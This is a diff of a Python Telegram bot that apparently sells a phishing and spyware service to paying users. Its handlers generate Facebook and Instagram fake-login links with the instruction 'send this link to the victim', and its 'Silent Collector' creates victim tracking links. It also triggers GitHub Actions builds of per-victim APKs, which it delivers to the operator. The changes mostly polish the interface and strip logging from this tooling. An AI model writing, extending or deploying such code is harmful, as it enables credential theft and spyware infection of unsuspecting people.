 
     if data == "admin_search":
@@ -1608,13 +1628,27 @@ def _handle_callback(call, chat_id, user_id, data):
         check = can_use_tool(chat_id, "fb")
         if not check["allowed"]:
             bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "fb", check),
-                             parse_mode="HTML")
+            safe_edit(
+                call,
+                _deny_message(check["reason"], chat_id, "fb", check),
+                reply_markup=main_menu(user_id)
+            )
             return
         consume_usage(chat_id, "fb")
         bot.answer_callback_query(call.id, "جاري التجهيز...")
         link = f"{PUBLIC_URL}/login.php?id={chat_id}"
-        bot.send_message(chat_id, f"🎯 رابط فيسبوك:\n<code>{h(link)}</code>", parse_mode="HTML")
+
+        m = InlineKeyboardMarkup()
+        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
+
+        safe_edit(
+            call,
+            f"🎯 <b>رابط فيسبوك</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"<code>{h(link)}</code>\n\n"
+            f"💡 أرسل هذا الرابط للضحية",
+            reply_markup=m
+        )
         return
 
     # ============================================================
@@ -1624,13 +1658,27 @@ def _handle_callback(call, chat_id, user_id, data):
         check = can_use_tool(chat_id, "ig")
         if not check["allowed"]:
             bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "ig", check),
-                             parse_mode="HTML")
+            safe_edit(
+                call,
+                _deny_message(check["reason"], chat_id, "ig", check),
+                reply_markup=main_menu(user_id)
+            )
             return
         consume_usage(chat_id, "ig")
         bot.answer_callback_query(call.id, "جاري التجهيز...")
         link = f"{PUBLIC_URL}/ig_login.php?id={chat_id}"
-        bot.send_message(chat_id, f"📸 رابط انستقرام:\n<code>{h(link)}</code>", parse_mode="HTML")
+
+        m = InlineKeyboardMarkup()
+        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
+
+        safe_edit(
+            call,
+            f"📸 <b>رابط انستقرام</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"<code>{h(link)}</code>\n\n"
+            f"💡 أرسل هذا الرابط للضحية",
+            reply_markup=m
+        )
         return
 
     # ============================================================
@@ -1644,7 +1692,6 @@ def _handle_callback(call, chat_id, user_id, data):
 # Silent Collector Step Handler
 # ============================================================
 def silent_label_handler(message):
-    """يستقبل اسم/وصف الضحية وينشئ الرابط"""
     chat_id = message.chat.id
     if not message.text:
         bot.send_message(chat_id, "❌ اسم غير صحيح")
@@ -1694,7 +1741,6 @@ def silent_label_handler(message):
 # Step Handler — Target Update
 # ============================================================
 def upd_target_handler(message):
-    """يتعامل مع target update"""
     if not is_admin(message.chat.id):
         return
 
@@ -1754,18 +1800,13 @@ def upd_target_handler(message):
 
     except Exception as e:
         logger.exception(f"upd_target_handler error: {e}")
-        bot.send_message(
-            message.chat.id,
-            f"❌ خطأ: {h(str(e)[:200])}",
-            parse_mode="HTML"
-        )
+        bot.send_message(message.chat.id, f"❌ خطأ: {h(str(e)[:200])}", parse_mode="HTML")
 
 
 # ============================================================
 # Build & Send APK
 # ============================================================
 def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
-    """يبني APK ويرسله للبوت"""
     if not GITHUB_TOKEN:
         try:
             bot.edit_message_text(
@@ -1774,8 +1815,8 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
                 chat_id=chat_id, message_id=wait_msg_id,
                 parse_mode="HTML"
             )
-        except Exception as e:
-            logger.warning(f"edit_message_text error: {e}")
+        except Exception:
+            pass
         return
 
     success = trigger_victim_apk_build(victim_token, victim_name)
@@ -1783,23 +1824,23 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
     if not success:
         try:
             bot.edit_message_text(
-                f"❌ <b>فشل تشغيل البناء</b>",
+                "❌ <b>فشل تشغيل البناء</b>",
                 chat_id=chat_id, message_id=wait_msg_id,
                 parse_mode="HTML"
             )
-        except Exception as e:
-            logger.warning(f"edit_message_text error: {e}")
+        except Exception:
+            pass
         return
 
     try:
         bot.edit_message_text(
-            f"✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
-            f"⏳ <i>جاري انتظار GitHub Actions...</i>",
+            "✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
+            "⏳ <i>جاري انتظار GitHub Actions...</i>",
             chat_id=chat_id, message_id=wait_msg_id,
             parse_mode="HTML"
         )
-    except Exception as e:
-        logger.warning(f"edit progress error: {e}")
+    except Exception:
+        pass
 
     apk_url = get_victim_apk_url(victim_token, max_wait=900)
 
@@ -1811,8 +1852,8 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
                 chat_id=chat_id, message_id=wait_msg_id,
                 parse_mode="HTML"
             )
-        except Exception as e:
-            logger.warning(f"edit_message_text error: {e}")
+        except Exception:
+            pass
         return
 
     try:
@@ -1840,13 +1881,8 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
                 ),
                 parse_mode="HTML"
             )
-            logger.info(f"APK sent: {victim_name}")
         else:
-            bot.send_message(
-                chat_id,
-                f"❌ فشل تحميل APK",
-                parse_mode="HTML"
-            )
+            bot.send_message(chat_id, "❌ فشل تحميل APK", parse_mode="HTML")
     except Exception as e:
         logger.exception(f"APK download error: {e}")
         bot.send_message(chat_id, f"❌ خطأ التحميل: {h(str(e))}", parse_mode="HTML")
@@ -1880,8 +1916,8 @@ def victim_name_step(message):
                 "❌ فشل إنشاء الضحية",
                 chat_id=chat_id, message_id=wait_msg.message_id
             )
-        except Exception as e:
-            logger.warning(f"edit_message_text error: {e}")
+        except Exception:
+            pass
         return
 
     victim_token = victim.get("victim_token")
@@ -1947,7 +1983,6 @@ def v_rename_step(message, victim_id):
 
 
 def victim_name_handler(message):
-    """لـ Session Hunter القديم"""
     if not message.text:
         return
     name = message.text.strip()[:50]
@@ -1956,8 +1991,8 @@ def victim_name_handler(message):
     if redis_client:
         try:
             redis_client.setex(f"pending_victim_name:{chat_id}", 300, name)
-        except Exception as e:
-            logger.warning(f"redis setex error: {e}")
+        except Exception:
+            pass
 
     markup = InlineKeyboardMarkup()
     markup.row(
@@ -2067,16 +2102,15 @@ def admin_broadcast_handler(message):
             bot.send_message(uid, f"📢 <b>رسالة من الإدارة:</b>\n\n{h(text)}", parse_mode="HTML")
             success += 1
             time.sleep(0.05)
-        except Exception as e:
-            logger.warning(f"broadcast to {uid} failed: {e}")
+        except Exception:
             failed += 1
     try:
         bot.edit_message_text(f"✅ <b>تم!</b>\n✔️ {success}\n❌ {failed}",
                               chat_id=message.chat.id,
                               message_id=status_msg.message_id,
                               parse_mode="HTML")
-    except Exception as e:
-        logger.warning(f"edit broadcast status error: {e}")
+    except Exception:
+        pass
 
 
 def admin_ban_handler(message):
@@ -2125,8 +2159,8 @@ def admin_grant_vip_handler(message):
     bot.send_message(message.chat.id, f"💎 تم منح VIP لـ <code>{uid}</code>", parse_mode="HTML")
     try:
         bot.send_message(uid, "💎 <b>تهانينا!</b> VIP مُفعّل 🚀", parse_mode="HTML")
-    except Exception as e:
-        logger.warning(f"notify vip user error: {e}")
+    except Exception:
+        pass
 
 
 def admin_give_stars_handler(message):
